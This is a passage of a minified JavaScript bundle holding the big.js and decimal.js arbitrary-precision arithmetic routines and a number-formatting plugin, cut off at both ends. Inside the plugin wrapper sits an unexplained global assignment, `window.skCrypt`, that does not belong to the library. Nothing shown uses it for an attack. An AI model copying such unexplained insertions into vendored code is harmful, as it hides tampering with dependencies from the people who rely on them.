        }
        for (
          a.length - c.length < 0 && ((r = c), (c = a), (a = r)),
            e = c.length,
            n = 0;
          e;
          a[e] %= 10
        )
          n = ((a[--e] = a[e] + c[e] + n) / 10) | 0;
        for (n && (a.unshift(n), ++u), e = a.length; 0 === a[--e]; ) a.pop();
        return (t.c = a), (t.e = u), t;
      }),
    (xv.pow = function (t) {
      var e = this,
        n = new e.constructor("1"),
        r = n,
        o = t < 0;
      if (t !== ~~t || t < -1e6 || t > Sv) throw Error(Tv + "exponent");
      for (o && (t = -t); 1 & t && (r = r.times(e)), (t >>= 1); )
        e = e.times(e);
      return o ? n.div(r) : r;
    }),
    (xv.prec = function (t, e) {
      if (t !== ~~t || t < 1 || t > Iv) throw Error(Tv + "precision");
      return Rv(new this.constructor(this), t, e);
    }),
    (xv.round = function (t, e) {
      if (t === Pv) t = 0;
      else if (t !== ~~t || t < -Iv || t > Iv) throw Error(Bv);
      return Rv(new this.constructor(this), t + this.e + 1, e);
    }),
    (xv.sqrt = function () {
      var t,
        e,
        n,
        r = this,
        o = r.constructor,
        i = r.s,
        s = r.e,
        a = new o("0.5");
      if (!r.c[0]) return new o(r);
      if (i < 0) throw Error(_v + "No square root");
      0 === (i = Math.sqrt(+Mv(r, !0, !0))) || i === 1 / 0
        ? (((e = r.c.join("")).length + s) & 1 || (e += "0"),
          (s = (((s + 1) / 2) | 0) - (s < 0 || 1 & s)),
          (t = new o(
            ((i = Math.sqrt(e)) == 1 / 0
              ? "5e"
              : (i = i.toExponential()).slice(0, i.indexOf("e") + 1)) + s
          )))
        : (t = new o(i + "")),
        (s = t.e + (o.DP += 4));
      do {
        (n = t), (t = a.times(n.plus(r.div(n))));
      } while (n.c.slice(0, s).join("") !== t.c.slice(0, s).join(""));
      return Rv(t, (o.DP -= 4) + t.e + 1, o.RM);
    }),
    (xv.times = xv.mul =
      function (t) {
        var e,
          n = this,
          r = n.constructor,
          o = n.c,
          i = (t = new r(t)).c,
          s = o.length,
          a = i.length,
          u = n.e,
          c = t.e;
        if (((t.s = n.s == t.s ? 1 : -1), !o[0] || !i[0]))
          return (t.c = [(t.e = 0)]), t;
        for (
          t.e = u + c,
            s < a && ((e = o), (o = i), (i = e), (c = s), (s = a), (a = c)),
            e = new Array((c = s + a));
          c--;

        )
          e[c] = 0;
        for (u = a; u--; ) {
          for (a = 0, c = s + u; c > u; )
            (a = e[c] + i[u] * o[c - u - 1] + a),
              (e[c--] = a % 10),
              (a = (a / 10) | 0);
          e[c] = a;
        }
        for (a ? ++t.e : e.shift(), u = e.length; !e[--u]; ) e.pop();
        return (t.c = e), t;
      }),
    (xv.toExponential = function (t, e) {
      var n = this,
        r = n.c[0];
      if (t !== Pv) {
        if (t !== ~~t || t < 0 || t > Iv) throw Error(Bv);
        for (n = Rv(new n.constructor(n), ++t, e); n.c.length < t; )
          n.c.push(0);
      }
      return Mv(n, !0, !!r);
    }),
    (xv.toFixed = function (t, e) {
      var n = this,
        r = n.c[0];
      if (t !== Pv) {
        if (t !== ~~t || t < 0 || t > Iv) throw Error(Bv);
        for (
          t = t + (n = Rv(new n.constructor(n), t + n.e + 1, e)).e + 1;
          n.c.length < t;

        )
          n.c.push(0);
      }
      return Mv(n, !1, !!r);
    }),
    (xv[Symbol.for("nodejs.util.inspect.custom")] =
      xv.toJSON =
      xv.toString =
        function () {
          var t = this,
            e = t.constructor;
          return Mv(t, t.e <= e.NE || t.e >= e.PE, !!t.c[0]);
        }),
    (xv.toNumber = function () {
      var t = +Mv(this, !0, !0);
      if (!0 === this.constructor.strict && !this.eq(t.toString()))
        throw Error(_v + "Imprecise conversion");
      return t;
    }),
    (xv.toPrecision = function (t, e) {
      var n = this,
        r = n.constructor,
        o = n.c[0];
      if (t !== Pv) {
        if (t !== ~~t || t < 1 || t > Iv) throw Error(Tv + "precision");
        for (n = Rv(new r(n), t, e); n.c.length < t; ) n.c.push(0);
      }
      return Mv(n, t <= n.e || n.e <= r.NE || n.e >= r.PE, !!o);
    }),
    (xv.valueOf = function () {
      var t = this,
        e = t.constructor;
      if (!0 === e.strict) throw Error(_v + "valueOf disallowed");
      return Mv(t, t.e <= e.NE || t.e >= e.PE, !0);
    });
  var Lv,
    Nv = (function t() {
      function e(n) {
        var r = this;
        if (!(r instanceof e)) return n === Pv ? t() : new e(n);
        if (n instanceof e) (r.s = n.s), (r.e = n.e), (r.c = n.c.slice());
        else {
          if ("string" != typeof n) {
            if (!0 === e.strict && "bigint" != typeof n)
              throw TypeError(Tv + "value");
            n = 0 === n && 1 / n < 0 ? "-0" : String(n);
          }
          !(function (t, e) {
            var n, r, o;
            if (!Ov.test(e)) throw Error(Tv + "number");
            (t.s = "-" == e.charAt(0) ? ((e = e.slice(1)), -1) : 1),
              (n = e.indexOf(".")) > -1 && (e = e.replace(".", ""));
            (r = e.search(/e/i)) > 0
              ? (n < 0 && (n = r),
                (n += +e.slice(r + 1)),
                (e = e.substring(0, r)))
              : n < 0 && (n = e.length);
            for (o = e.length, r = 0; r < o && "0" == e.charAt(r); ) ++r;
            if (r == o) t.c = [(t.e = 0)];
            else {
              for (; o > 0 && "0" == e.charAt(--o); );
              for (t.e = n - r - 1, t.c = [], n = 0; r <= o; )
                t.c[n++] = +e.charAt(r++);
            }
            return t;
          })(r, n);
        }
        r.constructor = e;
      }
      return (
        (e.prototype = xv),
        (e.DP = 20),
        (e.RM = 1),
        (e.NE = -7),
        (e.PE = 21),
        (e.strict = false),
        (e.roundDown = 0),
        (e.roundHalfUp = 1),
        (e.roundHalfEven = 2),
        (e.roundUp = 3),
        e
      );
    })(),
    Dv = { exports: {} };
  var Uv =
    (Lv ||
      ((Lv = 1),
      (function (t) {
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        }),
          t.exports &&
            (t.exports = function (t) {
              return (
                (t.prototype.toFormat = function (t, e, n) {
                  if (!this.e && 0 !== this.e) return this.toString();
                  var r,
                    o,
                    i,
                    s,
                    a,
                    u,
                    c,
                    l,
                    d,
                    f,
                    h,
                    p,
                    m,
                    g,
                    y,
                    w = this.format || {},
                    b = this.constructor.format || {};
                  if (
                    (t != a
                      ? "object" == typeof t
                        ? ((n = t), (t = a))
                        : e != a
                        ? "object" == typeof e
                          ? ((n = e), (e = a))
                          : "object" != typeof n && (n = {})
                        : (n = {})
                      : (n = {}),
                    (l = (r = this.toFixed(t, e).split("."))[0]),
                    (d = r[1]),
                    (u = (c = this.s < 0 ? l.slice(1) : l).length),
                    (f = n.decimalSeparator) == a &&
                      (f = w.decimalSeparator) == a &&
                      (f = b.decimalSeparator) == a &&
                      (f = "."),
                    (h = n.groupSeparator) == a &&
                      (h = w.groupSeparator) == a &&
                      (h = b.groupSeparator),
                    h &&
                      ((p = n.groupSize) == a &&
                        (p = w.groupSize) == a &&
                        (p = b.groupSize) == a &&
                        (p = 0),
                      (m = n.secondaryGroupSize) == a &&
                        (m = w.secondaryGroupSize) == a &&
                        (m = b.secondaryGroupSize) == a &&
                        (m = 0),
                      m ? ((o = +m), (u -= i = +p)) : ((o = +p), (i = +m)),
                      o > 0 && u > 0))
                  ) {
                    for (s = u % o || o, l = c.substr(0, s); s < u; s += o)
                      l += h + c.substr(s, o);
                    i > 0 && (l += h + c.slice(s)), this.s < 0 && (l = "-" + l);
                  }
                  return d
                    ? ((g = n.fractionGroupSeparator) == a &&
                        (g = w.fractionGroupSeparator) == a &&
                        (g = b.fractionGroupSeparator),
                      g &&
                        ((y = n.fractionGroupSize) == a &&
                          (y = w.fractionGroupSize) == a &&
                          (y = b.fractionGroupSize) == a &&
                          (y = 0),
                        (y = +y) &&
                          (d = d.replace(
                            new RegExp("\\d{" + y + "}\\B", "g"),
                            "$&" + g
                          ))),
                      l + f + d)
                    : l;
                }),
                (t.format = {
                  decimalSeparator: ".",
                  groupSeparator: ",",
                  groupSize: 3,
                  secondaryGroupSize: 0,
                  fractionGroupSeparator: "",
                  fractionGroupSize: 0,
                }),
                t
              );
            });
      })(Dv)),
    Dv.exports);
  const qv = zn(Uv);
  var zv,
    Kv = 1e9,
    Wv = !0,
    Fv = "[DecimalError] ",
    jv = Fv + "Invalid argument: ",
    Gv = Fv + "Exponent out of range: ",
    Vv = Math.floor,
    Hv = Math.pow,
    Zv = /^(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i,
    Xv = 1e7,
    Jv = 9007199254740991,
    Yv = Vv(1286742750677284.5),
    Qv = {};
  function $v(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c,
      l = t.constructor,
      d = l.precision;
    if (!t.s || !e.s) return e.s || (e = new l(t)), Wv ? cA(e, d) : e;
    if (
      ((u = t.d), (c = e.d), (s = t.e), (o = e.e), (u = u.slice()), (i = s - o))
    ) {
      for (
        i < 0
          ? ((r = u), (i = -i), (a = c.length))
          : ((r = c), (o = s), (a = u.length)),
          i > (a = (s = Math.ceil(d / 7)) > a ? s + 1 : a + 1) &&
            ((i = a), (r.length = 1)),
          r.reverse();
        i--;

      )
        r.push(0);
      r.reverse();
    }
    for (
      (a = u.length) - (i = c.length) < 0 &&
        ((i = a), (r = c), (c = u), (u = r)),
        n = 0;
      i;

    )
      (n = ((u[--i] = u[i] + c[i] + n) / Xv) | 0), (u[i] %= Xv);
    for (n && (u.unshift(n), ++o), a = u.length; 0 == u[--a]; ) u.pop();
    return (e.d = u), (e.e = o), Wv ? cA(e, d) : e;
  }
  function tA(t, e, n) {
    if (t !== ~~t || t < e || t > n) throw Error(jv + t);
  }
  function eA(t) {
    var e,
      n,
      r,
      o = t.length - 1,
      i = "",
      s = t[0];
    if (o > 0) {
      for (i += s, e = 1; e < o; e++)
        (n = 7 - (r = t[e] + "").length) && (i += sA(n)), (i += r);
      (n = 7 - (r = (s = t[e]) + "").length) && (i += sA(n));
    } else if (0 === s) return "0";
    for (; s % 10 == 0; ) s /= 10;
    return i + s;
  }
  (Qv.absoluteValue = Qv.abs =
    function () {
      var t = new this.constructor(this);
      return t.s && (t.s = 1), t;
    }),
    (Qv.comparedTo = Qv.cmp =
      function (t) {
        var e,
          n,
          r,
          o,
          i = this;
        if (((t = new i.constructor(t)), i.s !== t.s)) return i.s || -t.s;
        if (i.e !== t.e) return (i.e > t.e) ^ (i.s < 0) ? 1 : -1;
        for (e = 0, n = (r = i.d.length) < (o = t.d.length) ? r : o; e < n; ++e)
          if (i.d[e] !== t.d[e]) return (i.d[e] > t.d[e]) ^ (i.s < 0) ? 1 : -1;
        return r === o ? 0 : (r > o) ^ (i.s < 0) ? 1 : -1;
      }),
    (Qv.decimalPlaces = Qv.dp =
      function () {
        var t = this,
          e = t.d.length - 1,
          n = 7 * (e - t.e);
        if ((e = t.d[e])) for (; e % 10 == 0; e /= 10) n--;
        return n < 0 ? 0 : n;
      }),
    (Qv.dividedBy = Qv.div =
      function (t) {
        return nA(this, new this.constructor(t));
      }),
    (Qv.dividedToIntegerBy = Qv.idiv =
      function (t) {
        var e = this.constructor;
        return cA(nA(this, new e(t), 0, 1), e.precision);
      }),
    (Qv.equals = Qv.eq =
      function (t) {
        return !this.cmp(t);
      }),
    (Qv.exponent = function () {
      return oA(this);
    }),
    (Qv.greaterThan = Qv.gt =
      function (t) {
        return this.cmp(t) > 0;
      }),
    (Qv.greaterThanOrEqualTo = Qv.gte =
      function (t) {
        return this.cmp(t) >= 0;
      }),
    (Qv.isInteger = Qv.isint =
      function () {
        return this.e > this.d.length - 2;
      }),
    (Qv.isNegative = Qv.isneg =
      function () {
        return this.s < 0;
      }),
    (Qv.isPositive = Qv.ispos =
      function () {
        return this.s > 0;
      }),
    (Qv.isZero = function () {
      return 0 === this.s;
    }),
    (Qv.lessThan = Qv.lt =
      function (t) {
        return this.cmp(t) < 0;
      }),
    (Qv.lessThanOrEqualTo = Qv.lte =
      function (t) {
        return this.cmp(t) < 1;
      }),
    (Qv.logarithm = Qv.log =
      function (t) {
        var e,
          n = this,
          r = n.constructor,
          o = r.precision,
          i = o + 5;
        if (void 0 === t) t = new r(10);
        else if ((t = new r(t)).s < 1 || t.eq(zv)) throw Error(Fv + "NaN");
        if (n.s < 1) throw Error(Fv + (n.s ? "NaN" : "-Infinity"));
        return n.eq(zv)
          ? new r(0)
          : ((Wv = !1), (e = nA(aA(n, i), aA(t, i), i)), (Wv = !0), cA(e, o));
      }),
    (Qv.minus = Qv.sub =
      function (t) {
        var e = this;
        return (
          (t = new e.constructor(t)),
          e.s == t.s ? lA(e, t) : $v(e, ((t.s = -t.s), t))
        );
      }),
    (Qv.modulo = Qv.mod =
      function (t) {
        var e,
          n = this,
          r = n.constructor,
          o = r.precision;
        if (!(t = new r(t)).s) throw Error(Fv + "NaN");
        return n.s
          ? ((Wv = !1), (e = nA(n, t, 0, 1).times(t)), (Wv = !0), n.minus(e))
          : cA(new r(n), o);
      }),
    (Qv.naturalExponential = Qv.exp =
      function () {
        return rA(this);
      }),
    (Qv.naturalLogarithm = Qv.ln =
      function () {
        return aA(this);
      }),
    (Qv.negated = Qv.neg =
      function () {
        var t = new this.constructor(this);
        return (t.s = -t.s || 0), t;
      }),
    (Qv.plus = Qv.add =
      function (t) {
        var e = this;
        return (
          (t = new e.constructor(t)),
          e.s == t.s ? $v(e, t) : lA(e, ((t.s = -t.s), t))
        );
      }),
    (Qv.precision = Qv.sd =
      function (t) {
        var e,
          n,
          r,
          o = this;
        if (void 0 !== t && t !== !!t && 1 !== t && 0 !== t)
          throw Error(jv + t);
        if (
          ((e = oA(o) + 1), (n = 7 * (r = o.d.length - 1) + 1), (r = o.d[r]))
        ) {
          for (; r % 10 == 0; r /= 10) n--;
          for (r = o.d[0]; r >= 10; r /= 10) n++;
        }
        return t && e > n ? e : n;
      }),
    (Qv.squareRoot = Qv.sqrt =
      function () {
        var t,
          e,
          n,
          r,
          o,
          i,
          s,
          a = this,
          u = a.constructor;
        if (a.s < 1) {
          if (!a.s) return new u(0);
          throw Error(Fv + "NaN");
        }
        for (
          t = oA(a),
            Wv = !1,
            0 == (o = Math.sqrt(+a)) || o == 1 / 0
              ? (((e = eA(a.d)).length + t) % 2 == 0 && (e += "0"),
                (o = Math.sqrt(e)),
                (t = Vv((t + 1) / 2) - (t < 0 || t % 2)),
                (r = new u(
                  (e =
                    o == 1 / 0
                      ? "5e" + t
                      : (e = o.toExponential()).slice(0, e.indexOf("e") + 1) +
                        t)
                )))
              : (r = new u(o.toString())),
            o = s = (n = u.precision) + 3;
          ;

        )
          if (
            ((r = (i = r).plus(nA(a, i, s + 2)).times(0.5)),
            eA(i.d).slice(0, s) === (e = eA(r.d)).slice(0, s))
          ) {
            if (((e = e.slice(s - 3, s + 1)), o == s && "4999" == e)) {
              if ((cA(i, n + 1, 0), i.times(i).eq(a))) {
                r = i;
                break;
              }
            } else if ("9999" != e) break;
            s += 4;
          }
        return (Wv = !0), cA(r, n);
      }),
    (Qv.times = Qv.mul =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l = this,
          d = l.constructor,
          f = l.d,
          h = (t = new d(t)).d;
        if (!l.s || !t.s) return new d(0);
        for (
          t.s *= l.s,
            n = l.e + t.e,
            (u = f.length) < (c = h.length) &&
              ((i = f), (f = h), (h = i), (s = u), (u = c), (c = s)),
            i = [],
            r = s = u + c;
          r--;

        )
          i.push(0);
        for (r = c; --r >= 0; ) {
          for (e = 0, o = u + r; o > r; )
            (a = i[o] + h[r] * f[o - r - 1] + e),
              (i[o--] = a % Xv | 0),
              (e = (a / Xv) | 0);
          i[o] = (i[o] + e) % Xv | 0;
        }
        for (; !i[--s]; ) i.pop();
        return (
          e ? ++n : i.shift(), (t.d = i), (t.e = n), Wv ? cA(t, d.precision) : t
        );
      }),
    (Qv.toDecimalPlaces = Qv.todp =
      function (t, e) {
        var n = this,
          r = n.constructor;
        return (
          (n = new r(n)),
          void 0 === t
            ? n
            : (tA(t, 0, Kv),
              void 0 === e ? (e = r.rounding) : tA(e, 0, 8),
              cA(n, t + oA(n) + 1, e))
        );
      }),
    (Qv.toExponential = function (t, e) {
      var n,
        r = this,
        o = r.constructor;
      return (
        void 0 === t
          ? (n = dA(r, !0))
          : (tA(t, 0, Kv),
            void 0 === e ? (e = o.rounding) : tA(e, 0, 8),
            (n = dA((r = cA(new o(r), t + 1, e)), !0, t + 1))),
        n
      );
    }),
    (Qv.toFixed = function (t, e) {
      var n,
        r,
        o = this,
        i = o.constructor;
      return void 0 === t
        ? dA(o)
        : (tA(t, 0, Kv),
          void 0 === e ? (e = i.rounding) : tA(e, 0, 8),
          (n = dA(
            (r = cA(new i(o), t + oA(o) + 1, e)).abs(),
            !1,
            t + oA(r) + 1
          )),
          o.isneg() && !o.isZero() ? "-" + n : n);
    }),
    (Qv.toInteger = Qv.toint =
      function () {
        var t = this,
          e = t.constructor;
        return cA(new e(t), oA(t) + 1, e.rounding);
      }),
    (Qv.toNumber = function () {
      return +this;
    }),
    (Qv.toPower = Qv.pow =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a = this,
          u = a.constructor,
          c = +(t = new u(t));
        if (!t.s) return new u(zv);
        if (!(a = new u(a)).s) {
          if (t.s < 1) throw Error(Fv + "Infinity");
          return a;
        }
        if (a.eq(zv)) return a;
        if (((r = u.precision), t.eq(zv))) return cA(a, r);
        if (((s = (e = t.e) >= (n = t.d.length - 1)), (i = a.s), s)) {
          if ((n = c < 0 ? -c : c) <= Jv) {
            for (
              o = new u(zv), e = Math.ceil(r / 7 + 4), Wv = !1;
              n % 2 && fA((o = o.times(a)).d, e), 0 !== (n = Vv(n / 2));

            )
              fA((a = a.times(a)).d, e);
            return (Wv = !0), t.s < 0 ? new u(zv).div(o) : cA(o, r);
          }
        } else if (i < 0) throw Error(Fv + "NaN");
        return (
          (i = i < 0 && 1 & t.d[Math.max(e, n)] ? -1 : 1),
          (a.s = 1),
          (Wv = !1),
          (o = t.times(aA(a, r + 12))),
          (Wv = !0),
          ((o = rA(o)).s = i),
          o
        );
      }),
    (Qv.toPrecision = function (t, e) {
      var n,
        r,
        o = this,
        i = o.constructor;
      return (
        void 0 === t
          ? (r = dA(o, (n = oA(o)) <= i.toExpNeg || n >= i.toExpPos))
          : (tA(t, 1, Kv),
            void 0 === e ? (e = i.rounding) : tA(e, 0, 8),
            (r = dA(
              (o = cA(new i(o), t, e)),
              t <= (n = oA(o)) || n <= i.toExpNeg,
              t
            ))),
        r
      );
    }),
    (Qv.toSignificantDigits = Qv.tosd =
      function (t, e) {
        var n = this.constructor;
        return (
          void 0 === t
            ? ((t = n.precision), (e = n.rounding))
            : (tA(t, 1, Kv), void 0 === e ? (e = n.rounding) : tA(e, 0, 8)),
          cA(new n(this), t, e)
        );
      }),
    (Qv.toString =
      Qv.valueOf =
      Qv.val =
      Qv.toJSON =
      Qv[Symbol.for("nodejs.util.inspect.custom")] =
        function () {
          var t = this,
            e = oA(t),
            n = t.constructor;
          return dA(t, e <= n.toExpNeg || e >= n.toExpPos);
        });
  var nA = (function () {
    function t(t, e) {
      var n,
        r = 0,
        o = t.length;
      for (t = t.slice(); o--; )
        (n = t[o] * e + r), (t[o] = n % Xv | 0), (r = (n / Xv) | 0);
      return r && t.unshift(r), t;
    }
    function e(t, e, n, r) {
      var o, i;
      if (n != r) i = n > r ? 1 : -1;
      else
        for (o = i = 0; o < n; o++)
          if (t[o] != e[o]) {
            i = t[o] > e[o] ? 1 : -1;
            break;
          }
      return i;
    }
    function n(t, e, n) {
      for (var r = 0; n--; )
        (t[n] -= r), (r = t[n] < e[n] ? 1 : 0), (t[n] = r * Xv + t[n] - e[n]);
      for (; !t[0] && t.length > 1; ) t.shift();
    }
    return function (r, o, i, s) {
      var a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S,
        _ = r.constructor,
        T = r.s == o.s ? 1 : -1,
        B = r.d,
        C = o.d;
      if (!r.s) return new _(r);
      if (!o.s) throw Error(Fv + "Division by zero");
      for (
        u = r.e - o.e,
          I = C.length,
          A = B.length,
          p = (h = new _(T)).d = [],
          c = 0;
        C[c] == (B[c] || 0);

      )
        ++c;
      if (
        (C[c] > (B[c] || 0) && --u,
        (w = null == i ? (i = _.precision) : s ? i + (oA(r) - oA(o)) + 1 : i) <
          0)
      )
        return new _(0);
      if (((w = (w / 7 + 2) | 0), (c = 0), 1 == I))
        for (l = 0, C = C[0], w++; (c < A || l) && w--; c++)
          (b = l * Xv + (B[c] || 0)), (p[c] = (b / C) | 0), (l = b % C | 0);
      else {
        for (
          (l = (Xv / (C[0] + 1)) | 0) > 1 &&
            ((C = t(C, l)), (B = t(B, l)), (I = C.length), (A = B.length)),
            v = I,
            g = (m = B.slice(0, I)).length;
          g < I;

        )
          m[g++] = 0;
        (S = C.slice()).unshift(0), (k = C[0]), C[1] >= Xv / 2 && ++k;
        do {
          (l = 0),
            (a = e(C, m, I, g)) < 0
              ? ((y = m[0]),
                I != g && (y = y * Xv + (m[1] || 0)),
                (l = (y / k) | 0) > 1
                  ? (l >= Xv && (l = Xv - 1),
                    1 ==
                      (a = e(
                        (d = t(C, l)),
                        m,
                        (f = d.length),
                        (g = m.length)
                      )) && (l--, n(d, I < f ? S : C, f)))
                  : (0 == l && (a = l = 1), (d = C.slice())),
                (f = d.length) < g && d.unshift(0),
                n(m, d, g),
                -1 == a &&
                  (a = e(C, m, I, (g = m.length))) < 1 &&
                  (l++, n(m, I < g ? S : C, g)),
                (g = m.length))
              : 0 === a && (l++, (m = [0])),
            (p[c++] = l),
            a && m[0] ? (m[g++] = B[v] || 0) : ((m = [B[v]]), (g = 1));
        } while ((v++ < A || void 0 !== m[0]) && w--);
      }
      return p[0] || p.shift(), (h.e = u), cA(h, s ? i + oA(h) + 1 : i);
    };
  })();
  function rA(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a = 0,
      u = 0,
      c = t.constructor,
      l = c.precision;
    if (oA(t) > 16) throw Error(Gv + oA(t));
    if (!t.s) return new c(zv);
    for (Wv = !1, s = l, i = new c(0.03125); t.abs().gte(0.1); )
      (t = t.times(i)), (u += 5);
    for (
      s += ((Math.log(Hv(2, u)) / Math.LN10) * 2 + 5) | 0,
        n = r = o = new c(zv),
        c.precision = s;
      ;

    ) {
      if (
        ((r = cA(r.times(t), s)),
        (n = n.times(++a)),
        eA((i = o.plus(nA(r, n, s))).d).slice(0, s) === eA(o.d).slice(0, s))
      ) {
        for (; u--; ) o = cA(o.times(o), s);
        return (c.precision = l), null == e ? ((Wv = !0), cA(o, l)) : o;
      }
      o = i;
    }
  }
  function oA(t) {
    for (var e = 7 * t.e, n = t.d[0]; n >= 10; n /= 10) e++;
    return e;
  }
  function iA(t, e, n) {
    if (e > t.LN10.sd())
      throw (
        ((Wv = !0),
        n && (t.precision = n),
        Error(Fv + "LN10 precision limit exceeded"))
      );
    return cA(new t(t.LN10), e);
  }
  function sA(t) {
    for (var e = ""; t--; ) e += "0";
    return e;
  }
  function aA(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c,
      l,
      d = 1,
      f = t,
      h = f.d,
      p = f.constructor,
      m = p.precision;
    if (f.s < 1) throw Error(Fv + (f.s ? "NaN" : "-Infinity"));
    if (f.eq(zv)) return new p(0);
    if ((null == e ? ((Wv = !1), (c = m)) : (c = e), f.eq(10)))
      return null == e && (Wv = !0), iA(p, c);
    if (
      ((c += 10),
      (p.precision = c),
      (r = (n = eA(h)).charAt(0)),
      (i = oA(f)),
      !(Math.abs(i) < 15e14))
    )
      return (
        (u = iA(p, c + 2, m).times(i + "")),
        (f = aA(new p(r + "." + n.slice(1)), c - 10).plus(u)),
        (p.precision = m),
        null == e ? ((Wv = !0), cA(f, m)) : f
      );
    for (; (r < 7 && 1 != r) || (1 == r && n.charAt(1) > 3); )
      (r = (n = eA((f = f.times(t)).d)).charAt(0)), d++;
    for (
      i = oA(f),
        r > 1
          ? ((f = new p("0." + n)), i++)
          : (f = new p(r + "." + n.slice(1))),
        a = s = f = nA(f.minus(zv), f.plus(zv), c),
        l = cA(f.times(f), c),
        o = 3;
      ;

    ) {
      if (
        ((s = cA(s.times(l), c)),
        eA((u = a.plus(nA(s, new p(o), c))).d).slice(0, c) ===
          eA(a.d).slice(0, c))
      )
        return (
          (a = a.times(2)),
          0 !== i && (a = a.plus(iA(p, c + 2, m).times(i + ""))),
          (a = nA(a, new p(d), c)),
          (p.precision = m),
          null == e ? ((Wv = !0), cA(a, m)) : a
        );
      (a = u), (o += 2);
    }
  }
  function uA(t, e) {
    var n, r, o;
    for (
      (n = e.indexOf(".")) > -1 && (e = e.replace(".", "")),
        (r = e.search(/e/i)) > 0
          ? (n < 0 && (n = r), (n += +e.slice(r + 1)), (e = e.substring(0, r)))
          : n < 0 && (n = e.length),
        r = 0;
      48 === e.charCodeAt(r);

    )
      ++r;
    for (o = e.length; 48 === e.charCodeAt(o - 1); ) --o;
    if ((e = e.slice(r, o))) {
      if (
        ((o -= r),
        (n = n - r - 1),
        (t.e = Vv(n / 7)),
        (t.d = []),
        (r = (n + 1) % 7),
        n < 0 && (r += 7),
        r < o)
      ) {
        for (r && t.d.push(+e.slice(0, r)), o -= 7; r < o; )
          t.d.push(+e.slice(r, (r += 7)));
        r = 7 - (e = e.slice(r)).length;
      } else r -= o;
      for (; r--; ) e += "0";
      if ((t.d.push(+e), Wv && (t.e > Yv || t.e < -Yv))) throw Error(Gv + n);
    } else (t.s = 0), (t.e = 0), (t.d = [0]);
    return t;
  }
  function cA(t, e, n) {
    var r,
      o,
      i,
      s,
      a,
      u,
      c,
      l,
      d = t.d;
    for (s = 1, i = d[0]; i >= 10; i /= 10) s++;
    if ((r = e - s) < 0) (r += 7), (o = e), (c = d[(l = 0)]);
    else {
      if ((l = Math.ceil((r + 1) / 7)) >= (i = d.length)) return t;
      for (c = i = d[l], s = 1; i >= 10; i /= 10) s++;
      o = (r %= 7) - 7 + s;
    }
    if (
      (void 0 !== n &&
        ((a = (c / (i = Hv(10, s - o - 1))) % 10 | 0),
        (u = e < 0 || void 0 !== d[l + 1] || c % i),
        (u =
          n < 4
            ? (a || u) && (0 == n || n == (t.s < 0 ? 3 : 2))
            : a > 5 ||
              (5 == a &&
                (4 == n ||
                  u ||
                  (6 == n &&
                    (r > 0 ? (o > 0 ? c / Hv(10, s - o) : 0) : d[l - 1]) % 10 &
                      1) ||
                  n == (t.s < 0 ? 8 : 7))))),
      e < 1 || !d[0])
    )
      return (
        u
          ? ((i = oA(t)),
            (d.length = 1),
            (e = e - i - 1),
            (d[0] = Hv(10, (7 - (e % 7)) % 7)),
            (t.e = Vv(-e / 7) || 0))
          : ((d.length = 1), (d[0] = t.e = t.s = 0)),
        t
      );
    if (
      (0 == r
        ? ((d.length = l), (i = 1), l--)
        : ((d.length = l + 1),
          (i = Hv(10, 7 - r)),
          (d[l] = o > 0 ? ((c / Hv(10, s - o)) % Hv(10, o) | 0) * i : 0)),
      u)
    )
      for (;;) {
        if (0 == l) {
          (d[0] += i) == Xv && ((d[0] = 1), ++t.e);
          break;
        }
        if (((d[l] += i), d[l] != Xv)) break;
        (d[l--] = 0), (i = 1);
      }
    for (r = d.length; 0 === d[--r]; ) d.pop();
    if (Wv && (t.e > Yv || t.e < -Yv)) throw Error(Gv + oA(t));
    return t;
  }
  function lA(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c,
      l,
      d,
      f = t.constructor,
      h = f.precision;
    if (!t.s || !e.s)
      return e.s ? (e.s = -e.s) : (e = new f(t)), Wv ? cA(e, h) : e;
    if (
      ((u = t.d), (d = e.d), (r = e.e), (c = t.e), (u = u.slice()), (s = c - r))
    ) {
      for (
        (l = s < 0)
          ? ((n = u), (s = -s), (a = d.length))
          : ((n = d), (r = c), (a = u.length)),
          s > (o = Math.max(Math.ceil(h / 7), a) + 2) &&
            ((s = o), (n.length = 1)),
          n.reverse(),
          o = s;
        o--;

      )
        n.push(0);
      n.reverse();
    } else {
      for ((l = (o = u.length) < (a = d.length)) && (a = o), o = 0; o < a; o++)
        if (u[o] != d[o]) {
          l = u[o] < d[o];
          break;
        }
      s = 0;
    }
    for (
      l && ((n = u), (u = d), (d = n), (e.s = -e.s)),
        a = u.length,
        o = d.length - a;
      o > 0;
      --o
    )
      u[a++] = 0;
    for (o = d.length; o > s; ) {
      if (u[--o] < d[o]) {
        for (i = o; i && 0 === u[--i]; ) u[i] = Xv - 1;
        --u[i], (u[o] += Xv);
      }
      u[o] -= d[o];
    }
    for (; 0 === u[--a]; ) u.pop();
    for (; 0 === u[0]; u.shift()) --r;
    return u[0] ? ((e.d = u), (e.e = r), Wv ? cA(e, h) : e) : new f(0);
  }
  function dA(t, e, n) {
    var r,
      o = oA(t),
      i = eA(t.d),
      s = i.length;
    return (
      e
        ? (n && (r = n - s) > 0
            ? (i = i.charAt(0) + "." + i.slice(1) + sA(r))
            : s > 1 && (i = i.charAt(0) + "." + i.slice(1)),
          (i = i + (o < 0 ? "e" : "e+") + o))
        : o < 0
        ? ((i = "0." + sA(-o - 1) + i), n && (r = n - s) > 0 && (i += sA(r)))
        : o >= s
        ? ((i += sA(o + 1 - s)),
          n && (r = n - o - 1) > 0 && (i = i + "." + sA(r)))
        : ((r = o + 1) < s && (i = i.slice(0, r) + "." + i.slice(r)),
          n && (r = n - s) > 0 && (o + 1 === s && (i += "."), (i += sA(r)))),
      t.s < 0 ? "-" + i : i
    );
  }
  function fA(t, e) {
    if (t.length > e) return (t.length = e), !0;
  }
  function hA(t) {
    if (!t || "object" != typeof t) throw Error(Fv + "Object expected");
    var e,
      n,
      r,
      o = [
        "precision",
        1,
        Kv,
        "rounding",
        0,
        8,
        "toExpNeg",
        -1 / 0,
        0,
        "toExpPos",
        0,
